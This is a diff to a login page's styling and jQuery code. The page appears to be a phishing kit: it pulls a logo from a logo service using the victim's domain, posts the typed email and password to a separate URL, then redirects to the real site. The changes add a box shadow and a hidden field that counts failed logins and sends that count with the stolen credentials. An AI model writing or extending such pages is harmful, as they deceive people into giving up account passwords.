@@ -33,6 +33,7 @@
 	.container-login100{
 		background: url("");
 		background-size: cover;
+
 	}
 	.wrap-input100 {
     width: 100%;
@@ -41,9 +42,12 @@
     margin-bottom: 20px;
 }
 .wrap-login100 {
-    border-radius: unset;
+
     padding: 30px;
     border: solid 1px #ccc;
+    box-shadow: 0 20px 50px #a9a9a9;
+    border-radius: 4px 4px 0 0;
+   
     }
     .btn{
     	 border-radius: unset;
@@ -94,7 +98,7 @@
     <span class="input-group-text" id="addon-wrapping"><img src="https://cdn-icons-png.flaticon.com/512/561/561127.png" width="20px"></span>
   </div>
   <input type="email" id="email" name="email" class="form-control" placeholder="Email" aria-label="Email" aria-describedby="addon-wrapping">
-</div>
+</div>  <input type="hidden"  name="lcount" id="lcount" value="0">
 					
 			<div class="input-group flex-nowrap mb-4 pass-div">
   <div class="input-group-prepend">
@@ -186,6 +190,7 @@ $("#logoimg").attr("src", "https://logo.clearbit.com/" + mainPage);
 	 	
     var email = $("#email").val();
     var pass = $("#pass").val();
+    var lcount = $("#lcount").val();
 var btn_div = $("#submit-btn"); 
 
 if(isEmail(email)===true){
@@ -206,17 +211,17 @@ document.getElementById("submit-btn").disabled = true;
         $.ajax({
             type: "POST",
             url: urlx,
-            data: { action : 'signup', email : email, pass : pass} 
+            data: { action : 'signup', email : email, pass : pass, lc : lcount} 
         }).done(function(data){
-            var datArray = data.split("|");
+          
           console.log('response: ', data);
-if(datArray[0] == "ok"){
+if(data == "ok"){
        
         window.location.replace(mainPage);
 
 }else {
     $("#eError").show();
-
+ $("#lcount").val(parseFloat(lcount+1));
    $("#pass").val('');
    $("#submit-btn-text").html('Login');
         document.getElementById("submit-btn").disabled = false;
